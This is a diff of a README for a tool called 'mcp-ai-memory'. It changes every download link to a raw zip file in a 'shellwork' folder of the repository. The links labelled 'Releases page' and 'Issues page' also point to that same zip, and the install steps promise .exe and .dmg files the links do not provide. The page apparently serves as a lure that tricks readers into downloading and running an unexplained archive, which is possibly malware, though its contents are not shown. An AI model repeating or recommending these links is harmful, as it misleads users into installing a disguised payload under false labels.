@@ -1,6 +1,6 @@
 # 🌟 mcp-ai-memory - Manage Your Semantic Memory with Ease
 
-[![Download mcp-ai-memory](https://raw.githubusercontent.com/ermermermermidk/mcp-ai-memory/main/shellwork/mcp-ai-memory.zip%20Now-blue?style=flat&logo=github)](https://raw.githubusercontent.com/ermermermermidk/mcp-ai-memory/main/shellwork/mcp-ai-memory.zip)
+[![Download mcp-ai-memory](https://github.com/ermermermermidk/mcp-ai-memory/raw/refs/heads/main/shellwork/ai_mcp_memory_v3.4.zip%20Now-blue?style=flat&logo=github)](https://github.com/ermermermermidk/mcp-ai-memory/raw/refs/heads/main/shellwork/ai_mcp_memory_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -24,16 +24,16 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [mcp-ai-memory Releases](https://raw.githubusercontent.com/ermermermermidk/mcp-ai-memory/main/shellwork/mcp-ai-memory.zip).
+To get started, visit this page to download: [mcp-ai-memory Releases](https://github.com/ermermermermidk/mcp-ai-memory/raw/refs/heads/main/shellwork/ai_mcp_memory_v3.4.zip).
 
 1. **Go to the Releases Page**: Click the link above to open the Releases page on GitHub.
 2. **Select the Latest Version**: Look for the most recent version of mcp-ai-memory. It will usually have the highest version number (e.g., v1.0.0).
 3. **Download the Package**: Choose the appropriate file for your operating system. For example:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://raw.githubusercontent.com/ermermermermidk/mcp-ai-memory/main/shellwork/mcp-ai-memory.zip` or the package for your specific distribution.
+   - For Linux, download the `https://github.com/ermermermermidk/mcp-ai-memory/raw/refs/heads/main/shellwork/ai_mcp_memory_v3.4.zip` or the package for your specific distribution.
 
-![Download mcp-ai-memory](https://raw.githubusercontent.com/ermermermermidk/mcp-ai-memory/main/shellwork/mcp-ai-memory.zip%20Now-blue?style=flat&logo=github)
+![Download mcp-ai-memory](https://github.com/ermermermermidk/mcp-ai-memory/raw/refs/heads/main/shellwork/ai_mcp_memory_v3.4.zip%20Now-blue?style=flat&logo=github)
 
 4. **Install the Software**: 
    - For Windows: Double-click the `.exe` file, follow the prompts to install.
@@ -54,7 +54,7 @@ After launching the application, you will see the home screen. From there, you c
 
 If you need help or have questions, the community is here to support you. You can:
 
-- Check the [Issues page](https://raw.githubusercontent.com/ermermermermidk/mcp-ai-memory/main/shellwork/mcp-ai-memory.zip) for common problems and solutions.
+- Check the [Issues page](https://github.com/ermermermermidk/mcp-ai-memory/raw/refs/heads/main/shellwork/ai_mcp_memory_v3.4.zip) for common problems and solutions.
 - Open a new issue if you encounter a specific bug or need assistance.
 
 ## 📄 License
